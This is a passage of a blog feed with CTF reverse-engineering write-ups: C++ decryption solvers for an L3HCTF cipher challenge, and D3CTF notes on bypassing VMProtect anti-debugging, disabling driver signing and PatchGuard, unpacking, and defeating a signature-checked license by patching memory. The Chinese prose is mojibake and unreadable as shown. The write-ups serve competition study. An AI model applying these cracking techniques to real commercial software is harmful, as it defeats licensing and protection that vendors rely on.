class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;L3HCTF&#123;%.32s&#125;\n&quot;</span>, v8);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// L3HCTF&#123;9c50d10ba864bedfb37d7efa4e110bf2&#125;</span></span><br></pre></td></tr></table></figure><p>L3HCTF{9c50d10ba864bedfb37d7efa4e110bf2}</p><h2 id="obfuscate"><a href="#obfuscate" class="headerlink" title="obfuscate"></a>obfuscate</h2><p>è°ƒè¯•ç¨‹åºå‘ç°ä¼šé€€å‡ºï¼Œåº”è¯¥æœ‰åè°ƒè¯•ï¼Œæ‰¾åˆ°å…¶ä¸­ä¸€ä¸ªexitå‡½æ•°ï¼Œäº¤å‰è°ƒç”¨å‘ç°å¤šå¤„è°ƒç”¨ï¼Œç›´æ¥æŠŠè¿™è¾¹çš„jmpæ”¹æˆretnå°±å¯ä»¥è¿‡åè°ƒè¯•ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-51.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-52.png" alt="alt text"></p><p>å•æ­¥è°ƒï¼Œå‘ç°å‡½æ•°é‡Œé¢ç¿»åˆ°è¿™ä¸¤ä¸ªç›¸é‚»å‡½æ•°æœ‰å¤§é‡çš„è®¡ç®—ä»£ç ã€‚</p><p>250å‡½æ•°æ˜¯ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²â€WelcometoL3HCTF!â€ï¼Œç„¶åç”Ÿæˆ26ä¸ªDWORDå¯†é’¥ï¼Œç„¶åå†å°†æ˜æ–‡å’Œç”Ÿæˆçš„å¯†é’¥ä¼ å…¥E80å‡½æ•°è¿›è¡ŒåŠ å¯†ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-53.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-54.png" alt="alt text"></p><p>ç”Ÿæˆçš„å¯†é’¥å¯ä»¥å†250å‡½æ•°ç»“å°¾å–å¾—ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-50.png" alt="alt text"></p><p>è°ƒè¯•E80åŠ å¯†å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªè¿™è¾¹å¾ªç¯æ˜¯å°†è¾“å…¥çš„ä¸¤ä¸ªDWORDå€¼åˆ†åˆ«åŠ ä¸ŠKey[0]å’ŒKey[1]ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-55.png" alt="alt text"></p><p>ä¸‹é¢æ˜¯ä»1å¼€å§‹åˆ°0xCçš„å¾ªç¯åŠ å¯†ï¼Œè¿™è¾¹æ˜¯æ ¸å¿ƒåŠ å¯†ï¼Œå»é™¤æ··æ·†æ— ç”¨è®¡ç®—ï¼ŒåŠ¨è°ƒå°±å¯ä»¥è¿˜åŸä»£ç ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-56.png" alt="alt text"></p><p>åŠ å¯†ä»£ç è¿˜åŸï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Encrypt_</span><span class="params">(<span class="type">uint32_t</span>* Input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Key[<span class="number">26</span>] = &#123;</span><br><span class="line">       <span class="number">0x122F2C9C</span>, <span class="number">0xE3BCCAE7</span>, <span class="number">0xD0FFC0F2</span>, <span class="number">0xD9A12544</span>, <span class="number">0x8A27992F</span>, <span class="number">0x55B1B935</span>, <span class="number">0x9110B161</span>, <span class="number">0x92811564</span>,</span><br><span class="line">       <span class="number">0x5CE9B359</span>, <span class="number">0x77C79A51</span>, <span class="number">0x4265527A</span>, <span class="number">0x8AB57C4B</span>, <span class="number">0x11529FA4</span>, <span class="number">0x9D9F63FF</span>, <span class="number">0xA970B936</span>, <span class="number">0xC8EABA0D</span>,</span><br><span class="line">       <span class="number">0x9A0EB4AA</span>, <span class="number">0xB0BC6E7F</span>, <span class="number">0x9784B100</span>, <span class="number">0x70DCD3AE</span>, <span class="number">0x6057A44E</span>, <span class="number">0x89187658</span>, <span class="number">0xE00098A8</span>, <span class="number">0x45773540</span>,</span><br><span class="line">       <span class="number">0xF9374F1A</span>, <span class="number">0x913FA548</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> A = Input[<span class="number">0</span>] + Key[<span class="number">0</span>];</span><br><span class="line">    <span class="type">uint32_t</span> B = Input[<span class="number">1</span>] + Key[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">0xC</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        A = Key[<span class="number">2</span> * i] + (((B ^ A) &gt;&gt; (<span class="number">32</span> - B)) | ((B ^ A) &lt;&lt; B));</span><br><span class="line"></span><br><span class="line">        B = Key[<span class="number">2</span> * i + <span class="number">1</span>] + (((B ^ A) &gt;&gt; (<span class="number">32</span> - A)) | ((B ^ A) &lt;&lt; A));</span><br><span class="line"></span><br><span class="line">        A ^= B;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = A;</span><br><span class="line">    Input[<span class="number">1</span>] = B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯†æ–‡çš„è¯ï¼ŒæŸ¥printfçš„äº¤å‰è°ƒç”¨å°±å¯ä»¥æ‰¾åˆ°ï¼Œè¿™è¾¹æœ‰è¿›è¡Œå¯†æ–‡æ¯”è¾ƒï¼ŒåŠ¨è°ƒå–v3æ•°ç»„æ•°æ®å³å¯ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-57.png" alt="alt text"></p><h3 id="è§£å¯†ä»£ç -4"><a href="#è§£å¯†ä»£ç -4" class="headerlink" title="è§£å¯†ä»£ç "></a>è§£å¯†ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt_</span><span class="params">(<span class="type">uint32_t</span>* Input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Key[<span class="number">26</span>] = &#123;</span><br><span class="line">       <span class="number">0x122F2C9C</span>, <span class="number">0xE3BCCAE7</span>, <span class="number">0xD0FFC0F2</span>, <span class="number">0xD9A12544</span>, <span class="number">0x8A27992F</span>, <span class="number">0x55B1B935</span>, <span class="number">0x9110B161</span>, <span class="number">0x92811564</span>,</span><br><span class="line">       <span class="number">0x5CE9B359</span>, <span class="number">0x77C79A51</span>, <span class="number">0x4265527A</span>, <span class="number">0x8AB57C4B</span>, <span class="number">0x11529FA4</span>, <span class="number">0x9D9F63FF</span>, <span class="number">0xA970B936</span>, <span class="number">0xC8EABA0D</span>,</span><br><span class="line">       <span class="number">0x9A0EB4AA</span>, <span class="number">0xB0BC6E7F</span>, <span class="number">0x9784B100</span>, <span class="number">0x70DCD3AE</span>, <span class="number">0x6057A44E</span>, <span class="number">0x89187658</span>, <span class="number">0xE00098A8</span>, <span class="number">0x45773540</span>,</span><br><span class="line">       <span class="number">0xF9374F1A</span>, <span class="number">0x913FA548</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> A = Input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">uint32_t</span> B = Input[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0xC</span>; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        A ^= B;</span><br><span class="line"></span><br><span class="line">        B -= Key[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">        B = ((B &lt;&lt; (<span class="number">32</span> - A)) | (B &gt;&gt; A));</span><br><span class="line">        B ^= A;</span><br><span class="line"></span><br><span class="line">        A -= Key[<span class="number">2</span> * i];</span><br><span class="line">        A = ((A &lt;&lt; (<span class="number">32</span> - B)) | (A &gt;&gt; B));</span><br><span class="line">        A ^= B;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Input[<span class="number">0</span>] = A - Key[<span class="number">0</span>];</span><br><span class="line">    Input[<span class="number">1</span>] = B - Key[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Key[<span class="number">26</span>] = &#123;</span><br><span class="line">         <span class="number">0x122F2C9C</span>, <span class="number">0xE3BCCAE7</span>, <span class="number">0xD0FFC0F2</span>, <span class="number">0xD9A12544</span>, <span class="number">0x8A27992F</span>, <span class="number">0x55B1B935</span>, <span class="number">0x9110B161</span>, <span class="number">0x92811564</span>,</span><br><span class="line">         <span class="number">0x5CE9B359</span>, <span class="number">0x77C79A51</span>, <span class="number">0x4265527A</span>, <span class="number">0x8AB57C4B</span>, <span class="number">0x11529FA4</span>, <span class="number">0x9D9F63FF</span>, <span class="number">0xA970B936</span>, <span class="number">0xC8EABA0D</span>,</span><br><span class="line">         <span class="number">0x9A0EB4AA</span>, <span class="number">0xB0BC6E7F</span>, <span class="number">0x9784B100</span>, <span class="number">0x70DCD3AE</span>, <span class="number">0x6057A44E</span>, <span class="number">0x89187658</span>, <span class="number">0xE00098A8</span>, <span class="number">0x45773540</span>,</span><br><span class="line">         <span class="number">0xF9374F1A</span>, <span class="number">0x913FA548</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Cipher[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0xF2A1BB1B</span>, <span class="number">0x21877CE9</span>, <span class="number">0x0AFD378A</span>, <span class="number">0xBC811A94</span>, <span class="number">0xAAE31E40</span>, <span class="number">0x3FD82E73</span>, <span class="number">0x4271B884</span>, <span class="number">0x398B35CC</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i+=<span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Decrypt_</span>((<span class="type">uint32_t</span>*)((<span class="type">uint8_t</span>*)Cipher + i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;L3HCTF&#123;%.32s&#125;\n&quot;</span>, Cipher);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// L3HCTF&#123;5fd277be39046905ef6348ba89131922&#125;</span></span><br></pre></td></tr></table></figure><p>L3HCTF{5fd277be39046905ef6348ba89131922}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;L3HCTF-Reverse-WP&quot;&gt;&lt;a href=&quot;#L3HCTF-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;L3HCTF Reverse WP&quot;&gt;&lt;/a&gt;L3HCTF Reverse WP&lt;/h1&gt;&lt;p&gt;æ”¾å‡ç”Ÿç‰©é’Ÿå·²ç»å€’è¿‡æ¥</summary>
      
    
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>D3CTF Reverse WP</title>
    <link href="https://tkazer.github.io/2025/06/01/D3CTF-Reverse/"/>
    <id>https://tkazer.github.io/2025/06/01/D3CTF-Reverse/</id>
    <published>2025-06-01T03:00:56.000Z</published>
    <updated>2025-06-01T08:47:36.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ¬¡æ¯”èµ›åšäº†d3kernelå’Œlocked doorè¿™ä¸¤é¢˜ï¼Œä¹Ÿæ˜¯éƒ½æ‹¿ä¸‹äº†ä¸€è¡€ã€‚è¿™ä¸¤é¢˜éƒ½æ˜¯å¼ºå¯¹æŠ—ç±»å‹ï¼Œå’Œä¼ ç»Ÿçš„åŠ è§£å¯†ç±»å‹é¢˜ç›®æœ‰åŒºåˆ«ã€‚kernelæ˜¯å†…æ ¸é€†å‘&amp;åè°ƒè¯•å¯¹æŠ—ï¼›ç¬¬äºŒé¢˜æ˜¯vmpå¯¹æŠ—+real worldç±»å‹ï¼Œæ¨¡ä»¿çš„åœºæ™¯æ˜¯å•†ä¸šè½¯ä»¶è®¸å¯è¯ä¼ªé€ é€†å‘ã€‚è¿™ä¸¤é¢˜éƒ½æŒºæœ‰æ„æ€çš„ï¼Œè´¨é‡ä¹Ÿéƒ½å¾ˆé«˜ã€‚</p><h1 id="locked-door"><a href="#locked-door" class="headerlink" title="locked door"></a>locked door</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="æŸ¥å£³"><a href="#æŸ¥å£³" class="headerlink" title="æŸ¥å£³"></a>æŸ¥å£³</h3><p>æŸ¥å£³å‘ç°æ˜¯vmp 3.5.1+çš„å£³ï¼Œ</p><p><img src="/2025/06/01/D3CTF-Reverse/image.png" alt="alt text"></p><h3 id="ç»•è¿‡åè°ƒè¯•"><a href="#ç»•è¿‡åè°ƒè¯•" class="headerlink" title="ç»•è¿‡åè°ƒè¯•"></a>ç»•è¿‡åè°ƒè¯•</h3><p>ç”±äºvmp 3.5.1+çš„æ£€æµ‹å¾ˆä¸¥ï¼Œscyllahideæ’ä»¶å·²ç»æ²¡åŠæ³•è¿‡äº†ï¼Œè¿™è¾¹èµ›ä¸­ç”¨çš„æ˜¯ä¸‹é¢è¿™ä¸ªä»˜è´¹è°ƒè¯•å™¨åŠ¨è°ƒçš„ï¼Œè¿™è¾¹æä¾›å¦ä¸€ä¸ªæ–¹æ¡ˆã€‚titanhideé©±åŠ¨æ¥å¤„ç†vmpè°ƒè¯•ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-2.png" alt="alt text"></p><p>ä½¿ç”¨VKDå·¥å…·çš„target64ä¸­çš„vminstallåœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œå®‰è£…ï¼Œä¼šå¤šå‡ºæ¥ä¸€ä¸ªå¼•å¯¼å¯åŠ¨ï¼Œé‡å¯ç”µè„‘é€‰æ‹©æ–°çš„å¼•å¯¼å¯åŠ¨å°±å¯ä»¥ï¼Œä»–ä¼šè¿›å…¥å†…æ ¸è°ƒè¯•æ¨¡å¼ï¼Œç¦æ­¢é©±åŠ¨å¼ºåˆ¶ç­¾åä»¥åŠå…³é—­PGï¼Œä¹Ÿå°±å¯ä»¥è®©æˆ‘ä»¬åŠ è½½titanhideé©±åŠ¨ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-81.png" alt="alt text"></p><p>åœ¨githubä¸Šä¸‹è½½titanhideç¼–è¯‘ç‰ˆæœ¬ã€‚</p><p><a href="https://github.com/mrexodia/TitanHide/releases">https://github.com/mrexodia/TitanHide/releases</a></p><p>ç›´æ¥æ‹–å…¥TitanHide.sysåŠ è½½è¿è¡Œã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-82.png" alt="alt text"></p><p>å°†titanhideä¸­çš„x64æ’ä»¶è¿™ä¸¤ä¸ªæ–‡ä»¶æ‹–å…¥dbgçš„pluginsæ–‡ä»¶å¤¹å³å¯ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-83.png" alt="alt text"></p><p>ç°åœ¨ç›´æ¥æ‰“å¼€x64dbgï¼Œæ‹–å…¥ç¨‹åºè¿è¡Œå°±å¯ä»¥è¿›è¡Œæ„‰å¿«çš„è°ƒè¯•äº†ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-84.png" alt="alt text"></p><h3 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h3><p>vmpæ‰¾OEPçš„æ€è·¯å¦‚ä¸‹ï¼Œæ–­ç‚¹QueryPerformanceCounteræˆ–GetSystemTimeAsFileTimeéƒ½å¯ä»¥ï¼Œå¯èƒ½æ‰§è¡Œä¸€æ¬¡ä¸å¤ªå¤Ÿï¼Œè¦æ‰§è¡Œåˆ°è¿”å›åœ°å€çš„ç¬¬äºŒä¸ªæ ˆé¡¶åœ°å€æ˜¯åœ¨.textæ®µèŒƒå›´å†…çš„ï¼Œæ­¤æ—¶ç¬¬äºŒä¸ªæ ˆé¡¶åœ°å€å°±æ˜¯opeäº†ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-85.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-86.png" alt="alt text"></p><p>å¾ˆæ˜æ˜¾çš„çœ‹å‡ºç¡®å®æ˜¯opeçš„ä»£ç </p><p><img src="/2025/06/01/D3CTF-Reverse/image-87.png" alt="alt text"></p><p>f4è®©ç¨‹åºèµ°åˆ°è¿™ä¸ªoepä¸‹é¢çš„è¿™ä¸ªjmpï¼Œè¿™æ—¶ç›´æ¥dumpå³å¯ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-88.png" alt="alt text"></p><p>IDAåç¼–è¯‘ï¼Œå­—ç¬¦ä¸²æœç´¢key1å®šä½åˆ°æ ¸å¿ƒmainå‡½æ•°ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-7.png" alt="alt text"></p><p>å¯ä»¥åœ¨oepè¿™ä¸ªjmpè·³è¿‡æ¥åçš„ä»£ç æ®µä¸‹é¢æ‰¾åˆ°æ ¸å¿ƒmainå‡½æ•°çš„è°ƒç”¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è°ƒè¯•å°±å¯ä»¥äº†ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-89.png" alt="alt text"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>mainå‡½æ•°å‘ç°åç¼–è¯‘ä¸å®Œå…¨ï¼Œå‘ç°æ˜¯sub_7FF73E5EC840é‡Œé¢è°ƒç”¨çš„ä¸€ä¸ªcallå¯¼è‡´çš„ï¼Œå¯ä»¥ä»ä¼ å‚+å‡½æ•°å…·ä½“å®ç°å‘ç°è¿™åº”è¯¥æ˜¯ä¸€ä¸ªè¯»å–keyæ–‡ä»¶çš„å‡½æ•°ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-12.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-14.png" alt="alt text"></p><p>æš‚æ—¶å°†ä¸¤å¤„è°ƒç”¨è¯»å–keyæ–‡ä»¶çš„å‡½æ•°ç›¸å…³ä»£ç nopï¼Œè®©æˆ‘ä»¬çš„åç¼–è¯‘å¯ä»¥çœ‹åˆ°å®Œæ•´ä»£ç ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-15.png" alt="alt text"></p><p>ä»¥ä¸‹æ˜¯å®Œæ•´åç¼–è¯‘ä»£ç ï¼Œç¬¬ä¸€ä¸ªifåº”è¯¥å°±æ˜¯æ ¡éªŒKey1çš„å‡½æ•°ï¼Œ sub_7FF73E5EC900è·Ÿè¿›çœ‹å‘ç°æ˜¯ä¸€å †åŠ å¯†ä»£ç ï¼Œä¸”å…¶ä¸­è°ƒç”¨çš„sub_7FF73E797910ä¼¼ä¹å­˜åœ¨è™šæ‹ŸåŒ–ï¼Œæ²¡åŠæ³•çœ‹ä»£ç ï¼Œåªèƒ½è¿›è¡Œè°ƒè¯•çœ‹çœ‹å…·ä½“æ˜¯ä»€ä¹ˆåŠŸèƒ½ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-16.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-17.png" alt="alt text"></p><p>è°ƒè¯•èµ°åˆ°sub_7FF73E5EC900è°ƒç”¨å¤„å‘ç°å‚æ•°ä¸€ä¼ å…¥çš„å°±æ˜¯key1.binçš„256å­—èŠ‚æ•°æ®æŒ‡é’ˆã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-18.png" alt="alt text"></p><p>æ­¥å…¥è·Ÿè¿›å‡½æ•°ï¼Œèµ°åˆ°sub_7FF73E797910å‡½æ•°è°ƒç”¨å¤„ï¼Œå‘ç°å‚æ•°äºŒä¼ å…¥çš„æ˜¯key1.binæ•°æ®ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-19.png" alt="alt text"></p><p>æ­¥è¿‡å‡½æ•°æ‰§è¡Œï¼Œè·³è½¬åˆ°åˆšåˆšå‚æ•°ä¸€çš„åœ°å€ï¼Œå‘ç°åªæ˜¯æŠŠå‚æ•°äºŒçš„æ•°æ®å¤åˆ¶äº†ä¸€ä»½åˆ°å‚æ•°ä¸€ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°å®é™…ä¸Šçš„ä½œç”¨å’Œmemcpyæ˜¯ä¸€æ ·çš„ã€‚</p><p>sub_7FF73E5EC900è¿™å‡½æ•°åŠŸèƒ½å°±æ˜¯å°†key.binè¾“å…¥æ•°æ®è¿›è¡Œä¸€æ¬¡åŠ å¯†ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-20.png" alt="alt text"></p><p>ifé‚£è¾¹è°ƒç”¨çš„å‡½æ•°æ˜¯å¯¹åŠ å¯†åçš„keyæ•°æ®è¿›è¡Œä¸€æ¬¡EVPç­¾åæ ¡éªŒï¼Œå¯ä»¥é€šè¿‡è¿›å…¥å„ä¸ªå‡½æ•°é‡Œé¢ï¼Œçœ‹åˆ°ä¸€äº›æ–‡æœ¬å°±å¯ä»¥çŸ¥é“æ˜¯opensslçš„EVPä»£ç ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-22.png" alt="alt text"></p><p>è€Œå‚æ•°ä¸€å°±æ˜¯è¦æ ¡éªŒçš„ç›®æ ‡æ–‡æœ¬ï¼Œè®©key1.binåŠ å¯†åçš„æ•°æ®å’Œâ€Welcomeâ€è¿›è¡Œç­¾åæ ¡éªŒã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-23.png" alt="alt text"></p><p>å¯ä»¥çœ‹åˆ°ä¸‹é¢è°ƒç”¨å‡½æ•°ç»“æ„å’Œä¸Šé¢key1å·®ä¸å¤šï¼Œéƒ½æ˜¯è¯»å…¥key2.binç„¶åè¿›è¡Œsub_7FF73E5EC900çš„ä¸€æ¬¡åŠ å¯†ï¼Œæœ€åä¸â€Here is the keyâ€è¿›è¡Œç­¾åæ ¡éªŒï¼Œä¸è¿‡key2çš„EVPæ ¡éªŒå‡½æ•°è¢«vmpä¿æŠ¤äº†ï¼Œæ²¡åŠæ³•æŸ¥çœ‹ä»£ç ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-24.png" alt="alt text"></p><p>ä»é¢˜ç›®çš„æè¿°å¯çŸ¥key1å’Œkey1æ ¡éªŒé€»è¾‘å®Œå…¨ç›¸åŒï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ä»è¿™ä¸ªç‚¹å‡ºå‘è¿›è¡Œä¼ªé€ ç»•è¿‡æ ¡éªŒã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-25.png" alt="alt text"></p><h2 id="ä¼ªé€ ç»•è¿‡ç­¾åæ ¡éªŒ"><a href="#ä¼ªé€ ç»•è¿‡ç­¾åæ ¡éªŒ" class="headerlink" title="ä¼ªé€ ç»•è¿‡ç­¾åæ ¡éªŒ"></a>ä¼ªé€ ç»•è¿‡ç­¾åæ ¡éªŒ</h2><p>ä¸Šæ–‡å¯çŸ¥key1å’Œkey2æ ¡éªŒé€»è¾‘æ˜¯å®Œå…¨ä¸€æ ·ï¼Œç”±äºkey1æ ¡éªŒæ˜¯é€šè¿‡çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å¤åˆ¶ä¸€ä»½key1.binæ”¹åè¦†ç›–key2.binï¼Œè®©ç¨‹åºè¯»key2.binçš„æ—¶å€™å®é™…è¯»å…¥çš„æ˜¯key1çš„æ•°æ®ï¼Œç„¶åæ–­ç‚¹åœ¨key2çš„EVPCheckå‡½æ•°ï¼Œå°†å‚æ•°ä¸€å­—ç¬¦ä¸²åœ°å€æ”¹æˆâ€™Welcomeâ€å­—ä¸²çš„åœ°å€ï¼Œæœ€ç»ˆè®©ç¨‹åºæ ¡éªŒæˆåŠŸã€‚</p><p>ä»¥ä¸‹å®æ“ï¼š</p><p>ä¿®æ”¹å®Œkey2.binåï¼Œæ–­ç‚¹åœ¨Check2å¤„ï¼Œå°†å‚æ•°ä¸€æ”¹æˆâ€Welcomeâ€çš„åœ°å€ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-26.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-27.png" alt="alt text"></p><p>æ­¥è¿‡æ‰§è¡ŒCheck2åï¼Œkey2æ ¡éªŒæˆåŠŸï¼Œflagå°±ä»Check2ä¿æŠ¤å‡½æ•°ä¸­è¾“å‡ºå‡ºæ¥äº†ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-28.png" alt="alt text"></p><p>d3ctf{Y0u_0p3n_7h3_d00r!!!}</p><h1 id="d3kernel"><a href="#d3kernel" class="headerlink" title="d3kernel"></a>d3kernel</h1><h2 id="R3åˆ†æ"><a href="#R3åˆ†æ" class="headerlink" title="R3åˆ†æ"></a>R3åˆ†æ</h2><p>è°ƒè¯•client.exeï¼Œå‘ç°å•æ­¥èµ°ä¼šè§¦å‘é™¤0å¼‚å¸¸ï¼Œæœ€åè·³åˆ°è¿™ä¸€ä¸ªå‡½æ•°ï¼Œå‘ç°é‡Œé¢å…¨éƒ½æ˜¯r3å±‚å•çº¯çš„ioäº¤äº’å’Œæ ¡éªŒï¼Œå¹¶æ²¡ç”¨ç”¨åˆ°é©±åŠ¨é€šä¿¡ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-29.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-30.png" alt="alt text"></p><p>è°ƒè¯•ï¼Œéšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿ï¼Œåœ¨è¿™ä¸¤å¤„strncmpå¯ä»¥æ‰¾åˆ°ä¸¤ä¸ªç›®æ ‡å¯¹åº”å­—ç¬¦ä¸²ï¼Œä½†è¿™ä¸ªpasswordæ˜¯fakeçš„ï¼Œåå­—åé¢è¿˜èƒ½ç”¨çš„åˆ°ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-33.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-32.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-34.png" alt="alt text"></p><p>æ±‡ç¼–ç•Œé¢å‘ç°ä¸Šå±‚çš„è¿™ä¸ªcallå­˜åœ¨å¼‚å¸¸ï¼Œå°†ç®­å¤´å¤„jmp nopå³å¯çœ‹åˆ°å®Œæ•´çš„ä»£ç ã€‚</p><p><img src="/2025/06/01/D3CTF-Reverse/image-35.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-36.png" alt="alt 